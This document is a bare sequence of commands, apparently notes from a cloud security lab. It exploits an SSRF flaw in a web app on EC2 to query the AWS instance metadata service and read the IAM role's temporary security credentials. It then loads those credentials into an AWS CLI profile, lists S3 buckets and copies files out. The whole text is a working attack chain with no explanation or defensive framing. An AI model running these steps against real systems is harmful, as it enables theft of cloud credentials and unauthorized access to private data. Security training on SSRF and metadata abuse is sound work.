aws sts get-caller-identity

curl "http://<EC2_PUBLIC_IP>:5000/fetch?url=http://169.254.169.254/latest/meta-data/instance-id"

curl "http://<EC2_PUBLIC_IP>:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

curl "http://<EC2_PUBLIC_IP>:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role name]"

aws configure --profile [new profile name]

vi ~/.aws/credentials

aws sts get-caller-identity --profile [new profile name]

aws s3 ls --profile [new profile name]

aws s3 ls [bucket name]

aws s3 cp s3://[bucket name]/[file name] ./[file name]


